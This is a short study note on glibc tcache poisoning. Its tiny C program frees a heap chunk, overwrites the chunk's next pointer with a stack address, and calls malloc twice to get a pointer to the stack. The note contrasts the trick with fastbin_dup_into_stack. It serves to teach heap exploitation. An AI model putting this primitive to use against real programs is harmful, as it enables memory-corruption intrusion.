# Tcache poisoning
> LongChampion, 21/03/2020

I think tcache is an easier version of fastbin.
```
#include <stdlib.h>

int main()
{
    long long Variable;
    void *a = malloc(0x100);

    free(a);
    *(long long *) a = &Variable;
    a = malloc(0x100);
    void *STACK = malloc(0x100);
}
```
This attack seem very similar to `fastbin_dup_into_stack`, but these are actually different. The reason come from the differ structure of tcache chunk. If you read [CTF Wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/implementation/tcache/), you will see that tcache chunk only contains one pointer to the next chunk with same size. Yes, only one pointer, no pre_size, size or everything else. To perform the attack, we just need to free a chunk, modify its pointer point to target address directly. Then we call `malloc` two times to receive a pointer to stack.

## Note
I wanna to repeat that, we need set pointer of victim chunk point to target address DIRECTLY, and `STACK` pointer will point to target address DIRECTLY, too. Don't be confused with `fastbin_dup_into_stack` attack.